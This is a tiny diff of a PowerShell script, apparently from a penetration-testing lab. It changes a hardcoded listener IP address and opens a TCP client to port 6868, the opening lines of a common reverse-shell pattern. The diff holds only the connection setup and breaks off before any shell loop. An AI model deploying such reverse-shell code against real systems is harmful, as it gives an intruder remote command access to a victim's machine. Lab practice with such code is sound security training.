@@ -1,6 +1,6 @@
 try 
 {
-    $IPAddress = "10.10.14.14"
+    $IPAddress = "10.10.14.80"
     $Port = 6868
 
     $client = New-Object System.Net.Sockets.TCPClient($IPAddress,$Port)
